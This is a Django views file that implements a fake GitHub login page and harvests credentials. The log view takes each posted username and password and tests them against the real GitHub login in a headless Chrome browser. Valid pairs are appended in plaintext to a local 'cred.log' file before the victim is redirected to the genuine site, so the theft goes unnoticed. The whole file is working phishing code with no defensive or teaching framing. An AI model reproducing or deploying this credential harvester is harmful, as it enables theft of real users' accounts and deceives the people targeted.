from django.shortcuts import render, redirect
from django.http import HttpResponse

# Create your views here.

def index(request, context=None):
    if (context == None):
        context = {'isValid' : True}
    return render(request, 'github.html', context)

def log(request):
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.common.exceptions import TimeoutException
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    import urllib3

    username = request.POST['login'].strip()
    pw = request.POST['password']

    chrome_options = Options()
    chrome_options.add_argument("--headless")

    driver = webdriver.Chrome(chrome_options = chrome_options)
    driver.get("https://github.com/login")

    print (driver.title)

    inputElement = driver.find_element_by_name("login")
    inputElement.send_keys(username)

    inputElement = driver.find_element_by_name("password")
    inputElement.send_keys(pw)

    inputElement.submit()

    isSuccess = True

    try:
        WebDriverWait(driver, 3).until(EC.invisibility_of_element_located((By.ID, "login_field")))
    except:
        isSuccess = False
        context = {"isValid": False}
    finally:
        driver.quit()

    if (not isSuccess):
        return index(request, context)

    print("Success")

    # Export
    with open("cred.log", "a") as f:
        f.write("username: " + username + "\n")
        f.write("password: " + pw + "\n\n")

    return redirect("https://www.github.com")
